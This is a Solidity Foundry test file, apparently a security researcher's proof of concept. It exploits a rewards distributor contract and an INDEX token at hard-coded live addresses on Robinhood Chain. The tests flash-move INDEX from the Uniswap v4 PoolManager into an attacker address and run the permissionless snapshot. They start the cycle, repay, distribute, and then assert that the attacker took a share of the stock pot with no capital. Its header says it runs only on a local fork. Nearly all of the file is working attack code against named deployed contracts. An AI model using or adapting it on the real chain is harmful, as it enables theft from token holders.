// SPDX-License-Identifier: MIT
// SAFE local-fork PoC only. Uses Foundry cheatcodes. No mainnet/testnet broadcast.
// Run: forge test --match-contract FlashSnapshotPoC -vvv --fork-url http://127.0.0.1:8545
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";

interface IIndex {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function holderCount() external view returns (uint256);
    function holderAt(uint256) external view returns (address);
    function minShareBalance() external view returns (uint256);
    function rewardsExcluded(address) external view returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IDist {
    function snapshotHolders(uint256 count) external;
    function startCycle() external;
    function distributeBatch(uint256 count) external;
    function nextDistribution() external view returns (uint256);
    function cycleActive() external view returns (bool);
    function snapPending() external view returns (bool);
    function snapCount() external view returns (uint256);
    function snapshotRemaining() external view returns (uint256);
    function eligible() external view returns (uint256);
    function remaining() external view returns (uint256);
    function canStart() external view returns (bool);
    function stocksLength() external view returns (uint256);
    function stockTokenAt(uint256) external view returns (address);
    function interval() external view returns (uint256);
}

interface IERC20Bal {
    function balanceOf(address) external view returns (uint256);
    function symbol() external view returns (string memory);
    function transfer(address, uint256) external returns (bool);
}

/// @notice Proves permissionless live-balanceOf snapshot is flash-loanable.
/// Temporary INDEX balance freezes into a pro-rata share of the stock pot;
/// capital is repaid before distributeBatch; stocks still pay out on frozen bals.
contract FlashSnapshotPoC is Test {
    // USDGBuyerDistributor on Robinhood Chain (chainId 4663)
    address constant DIST = 0x2459DedB3012d1E929EdD17DF26620120bDF11bf;
    address constant INDEX = 0x56910D4409F3a0C78C64DD8D0545FF0705389870;
    // Uniswap v4 PoolManager (rewardsExcluded LP custody of INDEX)
    address constant PM = 0x8366a39CC670B4001A1121B8F6A443A643e40951;

    IDist dist = IDist(DIST);
    IIndex index = IIndex(INDEX);

    address attacker = address(0xA11CE);

    function setUp() public {
        // Prefer local anvil fork (already forked); fall back to remote RPC.
        // IMPORTANT: never --broadcast; fork simulation only.
        string memory rpc = vm.envOr("RPC_URL", string("http://127.0.0.1:8545"));
        // If local anvil is up it already holds the fork; createSelectFork still works.
        try vm.createSelectFork(rpc) {
            console.log("forked via", rpc);
        } catch {
            vm.createSelectFork("https://rpc.mainnet.chain.robinhood.com/");
            console.log("forked via remote robinhood rpc");
        }
        vm.label(DIST, "USDGBuyerDistributor");
        vm.label(INDEX, "INDEX");
        vm.label(PM, "PoolManager");
        vm.label(attacker, "Attacker");
    }

    /// End-to-end: flash-shaped INDEX -> snapshot -> startCycle -> repay -> distribute.
    function test_flashInflatedSnapshotStealsProRataShare() public {
        // --- preconditions ---
        uint256 nextTs = dist.nextDistribution();
        console.log("block.timestamp:", block.timestamp);
        console.log("nextDistribution:", nextTs);
        console.log("interval:", dist.interval());
        if (block.timestamp < nextTs) {
            vm.warp(nextTs);
            console.log("warped to nextDistribution");
        }
        assertTrue(dist.canStart(), "cycle not startable");
        assertFalse(dist.cycleActive(), "cycle already active");
        assertFalse(dist.snapPending(), "snapshot already pending");

        uint256 stocks = dist.stocksLength();
        require(stocks > 0, "no stocks");
        console.log("registered stocks:", stocks);

        // Measure pot before attack
        uint256[] memory potBefore = new uint256[](stocks);
        uint256 potNonZero;
        uint256 potUnitsSum; // raw token units (mixed decimals; for logging only)
        for (uint256 k; k < stocks; ++k) {
            address tok = dist.stockTokenAt(k);
            potBefore[k] = IERC20Bal(tok).balanceOf(DIST);
            if (potBefore[k] > 0) {
                potNonZero++;
                potUnitsSum += potBefore[k];
                console.log("  pot", k, IERC20Bal(tok).symbol(), potBefore[k]);
            }
        }
        console.log("stocks with pot:", potNonZero);
        require(potNonZero > 0, "empty pot");

        // Prove stocks are transferable to arbitrary EOA (not allowlist-gated).
        // Use eth_call-style simulation via trySend path: prank DIST, transfer tiny amount, revert.
        {
            address sample = dist.stockTokenAt(0); // AAPL
            uint256 samplePot = IERC20Bal(sample).balanceOf(DIST);
            if (samplePot > 0) {
                uint256 snap = vm.snapshotState();
                uint256 sendAmt = samplePot > 1000 ? 1000 : samplePot;
                vm.prank(DIST);
                bool ok = IERC20Bal(sample).transfer(attacker, sendAmt);
                assertTrue(ok, "stock transfer to EOA failed - may be restricted");
                assertEq(IERC20Bal(sample).balanceOf(attacker), sendAmt, "stock not received");
                console.log("stock transferability: OK (AAPL to attacker EOA)");
                vm.revertToState(snap);
            }
        }

        // Flash source = INDEX in PoolManager (rewards-excluded).
        // Real exploit path: Uniswap v4 unlock -> take(INDEX) -> settle same tx.
        // Here: temporary transfer out of PM (same economic shape, zero capital).
        uint256 pmBal = index.balanceOf(PM);
        console.log("PM INDEX balance:", pmBal);
        console.log("INDEX totalSupply:", index.totalSupply());
        require(pmBal >= index.minShareBalance(), "no flashable INDEX in PM");

        // Leave dust in PM; flash the rest (must stay >= minShareBalance for registry join)
        uint256 flashAmt = pmBal - 1e18;
        console.log("flash amount:", flashAmt);

        uint256 holdersBefore = index.holderCount();
        console.log("holders before:", holdersBefore);

        uint256[] memory atkBefore = new uint256[](stocks);
        for (uint256 k; k < stocks; ++k) {
            atkBefore[k] = IERC20Bal(dist.stockTokenAt(k)).balanceOf(attacker);
        }

        // ========== ATTACK shape: flash -> snapshot -> startCycle -> repay -> distribute ==========
        // 1. Borrow INDEX into attacker (registry joins on transfer via _refreshHolder)
        vm.prank(PM);
        require(index.transfer(attacker, flashAmt), "flash transfer failed");
        assertGe(index.balanceOf(attacker), index.minShareBalance(), "attacker not eligible bal");
        console.log("attacker INDEX after flash:", index.balanceOf(attacker));
        console.log("holders after flash:", index.holderCount());

        // 2. Permissionless paginated snapshot while inflated balance is live.
        //    Large batches: anvil gas limit is 1e9; mainnet Nitro is also high.
        uint256 guard;
        while (dist.snapshotRemaining() > 0 || !dist.snapPending()) {
            dist.snapshotHolders(5_000);
            guard++;
            require(guard < 20, "snapshot loop runaway");
            if (dist.snapPending() && dist.snapshotRemaining() == 0) break;
        }
        console.log("snapCount:", dist.snapCount());
        console.log("eligible (inflated):", dist.eligible());

        // 3. Finalize cycle — freezes bals[] + pot[]
        dist.startCycle();
        assertTrue(dist.cycleActive(), "cycle not active");
        uint256 elig = dist.eligible();
        console.log("eligible frozen:", elig);
        console.log("attacker theoretical bps:", (flashAmt * 10_000) / elig);

        // 4. Repay flash — attacker INDEX back to 0, but bals[] already frozen
        vm.prank(attacker);
        require(index.transfer(PM, flashAmt), "repay failed");
        assertEq(index.balanceOf(attacker), 0, "attacker should hold 0 INDEX after repay");
        console.log("attacker INDEX after repay: 0 (bals frozen)");

        // 5. Permissionless distribute (can be multi-tx; attacker is near end of registry)
        guard = 0;
        while (dist.cycleActive()) {
            dist.distributeBatch(500);
            guard++;
            require(guard < 100, "distribute loop runaway");
        }
        console.log("distribution complete, batches:", guard);

        // ========== ASSERT PROFIT ==========
        uint256 gains;
        uint256 totalGainedUnits;
        for (uint256 k; k < stocks; ++k) {
            uint256 afterBal = IERC20Bal(dist.stockTokenAt(k)).balanceOf(attacker);
            uint256 gained = afterBal - atkBefore[k];
            if (gained > 0) {
                gains++;
                totalGainedUnits += gained;
                uint256 expected = (potBefore[k] * flashAmt) / elig;
                console.log("gained stock idx:", k);
                console.log("  symbol:", IERC20Bal(dist.stockTokenAt(k)).symbol());
                console.log("  amount:", gained);
                console.log("  expected:", expected);
                // Allow 1 unit rounding slack on the formula side
                if (expected > 0) {
                    assertGe(gained + 1, expected, "underpaid vs formula");
                }
            }
        }
        console.log("stocks attacker received:", gains);
        console.log("total raw units gained:", totalGainedUnits);
        assertGt(gains, 0, "attacker received no stock - exploit failed");

        // Net capital: 0 INDEX retained, positive stock inventory from holder pot
        assertEq(index.balanceOf(attacker), 0, "no INDEX capital left at risk");
        console.log("EXPLOIT CONFIRMED: zero-capital flash snapshot stole pro-rata pot share");
    }

    /// Lighter proof: freeze-only — no full distribute. Shows eligible includes flash bal
    /// after startCycle even though attacker later holds 0 INDEX.
    function test_snapshotFreezesLiveBalanceWithoutHoldingPeriod() public {
        uint256 nextTs = dist.nextDistribution();
        if (block.timestamp < nextTs) vm.warp(nextTs);
        if (dist.cycleActive() || dist.snapPending()) {
            // If a cycle is mid-flight on this fork tip, skip (state-dependent).
            console.log("cycle/snap already active - skip freeze-only test");
            return;
        }
        assertTrue(dist.canStart(), "not startable");

        uint256 flashAmt = index.minShareBalance(); // minimal eligible amount
        // Prefer PM; if insufficient, use deal+transfer from a funded scratch whale.
        uint256 pmBal = index.balanceOf(PM);
        address source = PM;
        if (pmBal < flashAmt) {
            // Unlikely; fall back would need a holder with balance
            revert("PM underfunded for minShare");
        }

        uint256 eligBeforeFlash;
        // Snapshot baseline without attacker (we'll do full path with flash)
        vm.prank(source);
        require(index.transfer(attacker, flashAmt), "flash fail");
        uint256 atkBal = index.balanceOf(attacker);
        console.log("attacker live bal during snapshot:", atkBal);

        uint256 guard;
        while (dist.snapshotRemaining() > 0 || !dist.snapPending()) {
            dist.snapshotHolders(5_000);
            guard++;
            require(guard < 20, "snap runaway");
            if (dist.snapPending() && dist.snapshotRemaining() == 0) break;
        }

        uint256 eligLive = dist.eligible();
        console.log("eligible while attacker holds:", eligLive);
        assertGe(eligLive, atkBal, "eligible should include attacker bal");

        dist.startCycle();
        uint256 eligFrozen = dist.eligible();
        console.log("eligible frozen:", eligFrozen);
        assertEq(eligFrozen, eligLive, "eligible must freeze at startCycle");

        // Repay — live balance gone
        vm.prank(attacker);
        require(index.transfer(source, flashAmt), "repay fail");
        assertEq(index.balanceOf(attacker), 0, "repaid");

        // Cycle still active with frozen eligible that includes the flash amount
        assertTrue(dist.cycleActive(), "cycle should stay active after repay");
        assertEq(dist.eligible(), eligFrozen, "frozen eligible immutable after repay");
        console.log("FREEZE CONFIRMED: eligible includes flash bal after attacker holds 0");

        // Do not leave fork mid-cycle if we want other tests clean — finish distribute cheaply
        guard = 0;
        while (dist.cycleActive()) {
            dist.distributeBatch(500);
            guard++;
            require(guard < 100, "dist runaway");
        }
    }
}
